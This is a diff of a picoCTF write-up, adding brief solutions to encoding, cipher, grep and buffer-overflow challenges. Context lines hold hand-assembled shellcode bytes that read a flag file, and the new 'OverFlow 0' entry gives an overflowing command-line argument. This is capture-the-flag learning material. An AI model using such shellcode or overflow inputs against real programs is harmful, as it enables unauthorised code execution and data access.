@@ -10,8 +10,14 @@ This type of problem is really easy to solve with python. Open python in your te
 #### Let's Warm Up
 This is another one that is really easy with python. When converting hexadecimal to ASCII my method of choice is to use ```chr()```
 
-### Warmed Up
+#### Warmed Up
 Another easy python challenge to convert to decimal ```int('0x3D', 16)```
+
+#### Bases
+If you haven't noticed already, python is your friend. This one I solved using ```base64.b64decode(encoded_string)```
+
+#### First Grep
+Easy grep, solved using ```cat file | grep "pico"```
 
 ## Forensics
 
@@ -26,6 +32,12 @@ Another easy one, just unzip.
 #### The Numbers
 This is another once where knowing the flag format helps us out significantly. We can see ```{ }``` which is part of our flag format, and can also see that none of the numbers are greater than 26. This probably means it's a simple substitution cypher. To solve this I wrote a pythons script that takes the alphabet and the provided numbers to print out the flag. ```python the_numbers.py```
 
+#### 13
+This is a caesar cipher, so just decode like any other.
+
+#### Easy 1
+This is vigenere cipher which we can pretty much tell by the provided table. To solve this one I wrote a python script ```easy1.py```
+
 ## Binary Exploitation
 
 #### handy-shellcode
@@ -34,7 +46,7 @@ This wasn't too hard but I always have the most fun with these. There's no overf
 <code>
 \x68\x74\x00\x00\x00\x68\x67\x2e\x74\x78\x68\x2f\x66\x6c\x61\x68\x33\x33\x65\x62\x68\x35\x35\x64\x32\x68\x64\x31\x36\x37\x68\x32\x39\x31\x66\x68\x32\x64\x36\x34\x68\x61\x38\x31\x36\x68\x34\x65\x31\x32\x68\x66\x30\x62\x38\x68\x65\x5f\x36\x5f\x68\x6c\x63\x6f\x64\x68\x73\x68\x65\x6c\x68\x6e\x64\x79\x2d\x68\x73\x2f\x68\x61\x68\x62\x6c\x65\x6d\x68\x2f\x70\x72\x6f
 </code><br/><br/>
-
+ 
 Then I completed it by adding the instructions to read the file, and executing the shellcode:
   
 <code>
@@ -43,6 +55,13 @@ echo -e '\x31\xc9\x51\x68\x74\x00\x00\x00\x68\x67\x2e\x74\x78\x68\x2f\x66\x6c\x6
 
 #### practice-run-1
 This one is too simple to need an explanation.
+
+#### OverFlow 0
+This one requires a basic overflow to retreive the flag. We can see that the buffer is 128 bytes, so we'll feed it more than that to crash the program and retrive the flag.
+  
+<code>
+./vuln 666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666
+</code>
 
 ## Web Exploitation
 
